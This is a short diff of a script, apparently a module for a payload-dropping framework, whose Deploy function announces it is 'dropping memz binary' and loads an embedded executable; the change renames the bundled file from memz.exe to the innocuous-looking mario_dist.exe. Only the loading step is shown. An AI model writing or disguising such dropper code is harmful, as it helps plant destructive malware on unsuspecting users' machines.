@@ -7,7 +7,7 @@
 
 //priority:150
 //timeout:150
-//import:/private/tmp/memz.exe
+//import:mario_dist.exe
 
 //go_import:os as os2
 
@@ -15,7 +15,7 @@ function Deploy() {
 	
     console.log("Starting to drop memz binary");
     // Getting our asset
-    var memzBin = GetAssetAsBytes("memz.exe");
+    var memzBin = GetAssetAsBytes("mario_dist.exe");
     console.log("errors: "+memzBin[1]);
 
     // Getting a random string
